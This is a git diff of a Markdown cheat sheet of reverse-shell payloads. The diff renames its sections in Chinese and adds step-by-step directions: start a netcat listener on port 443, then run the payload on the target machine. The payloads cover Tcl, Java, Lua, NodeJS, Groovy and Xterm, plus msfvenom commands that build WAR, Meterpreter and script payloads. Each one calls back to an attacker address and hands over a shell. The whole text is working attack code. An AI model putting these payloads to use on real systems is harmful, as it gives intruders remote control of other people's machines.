@@ -267,19 +267,28 @@ nc -lvp 443
 ```bash
 echo 'set s [socket 10.10.10.11 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
 ```
-## Java
+## 15、Java版本反弹shell
+首先在本地监听TCP协议443端口
 
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+
+linux平台：
 ```java
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.11/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+windows平台：
 ```java
 String host="127.0.0.1";
 int port=4444;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+创建线程：
 ```java
 Thread thread = new Thread(){
     public void run(){
@@ -288,27 +297,45 @@ Thread thread = new Thread(){
 }
 thread.start();
 ```
-## War:
+## 16、生成War文件反弹shell
+首先在本地监听TCP协议443端口
 
+```bash
+nc -lvp 443
+```
+使用如下命令生成war文件：
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war > reverse.war
-strings reverse.war | grep jsp # in order to get the name of the file
 ```
-## Lua:
-Linux only
+查看war包中shell的jsp文件名
 ```bash
+strings reverse.war | grep jsp
+```
+在靶机上部署war包后，访问shell的jsp文件，即可在监听端口获得反弹shell
 
+## 17、使用Lua脚本反弹shell
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+Linux平台：
+```bash
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.11','443');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
-Windows and Linux
+Windows及Linux平台：
 ```bash
-
 lua5.1 -e 'local host, port = "10.10.10.11", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
-## NodeJS:
+## 18、NodeJS版本反弹shell
+首先在本地监听TCP协议443端口
 
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
 ```js
-
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -319,7 +346,7 @@ lua5.1 -e 'local host, port = "10.10.10.11", 443 local socket = require("socket"
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
     });
-    return /a/; // Prevents the Node.js application form crashing
+    return /a/; 
 })();
 ```
 ```js
@@ -333,17 +360,21 @@ require('child_process').exec('nc -e /bin/sh 10.10.10.11 443')
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 
-## Groovy:
-```bash
+## 19、Groovy版本反弹shell
+首先在本地监听TCP协议443端口
 
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+```bash
 String host="10.10.10.11";
 int port=443;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
-Meterpreter Shell:
+## 20、生成Meterpreter反弹Shell:
 ```bash
-
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > reverse.exe
 ```
 ```bash
@@ -382,9 +413,14 @@ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.11" LPORT=443 -f raw > shell.s
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.11" LPORT=443 -f raw > shell.pl
 ```
-## Xterm:
-```bash
+## 21、使用Xterm反弹shell
+首先在本地监听TCP协议443端口
 
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+```bash
 xterm -display 10.10.10.11:1
 Xnest :1
 xhost +targetip
